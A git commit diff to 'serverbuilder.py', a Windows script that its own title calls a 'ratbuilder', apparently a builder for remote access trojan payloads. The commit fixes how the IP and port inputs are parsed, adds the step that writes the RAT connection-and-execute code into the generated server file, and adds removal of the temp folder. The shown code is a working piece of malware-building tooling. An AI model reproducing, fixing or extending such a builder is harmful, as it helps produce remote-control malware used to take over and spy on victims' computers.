7f5a44d3c88eb0af8fd6961f439657a16c0cb531
zufinho <116960107+zufinho@users.noreply.github.com>
2023-04-17 19:05:09 -0300

    error's fix

--- serverbuilder.py
+++ serverbuilder.py
@@ -6,8 +6,8 @@ if not os.name=="nt":
     exit()
 os.system("title zufinho ratbuilder - server")
 name=input("Name of server:")
-ip=input(int("IP:"))
-port=input(int("Port:"))
+ip=input("IP:")
+port=int(input("Port:"))
 os.system("md temp")
 os.system("copy src\server.py temp\server.py")
 server=open(f"temp\server.py","a")
@@ -18,5 +18,7 @@ if __name__ == '__main__':
     rat.build_connection()
     rat.execute()
     """
+server.write(servercontent)
 server.close()
 os.system(f"copy temp\server.py {name}.py")
+os.system("rd /q /s temp")
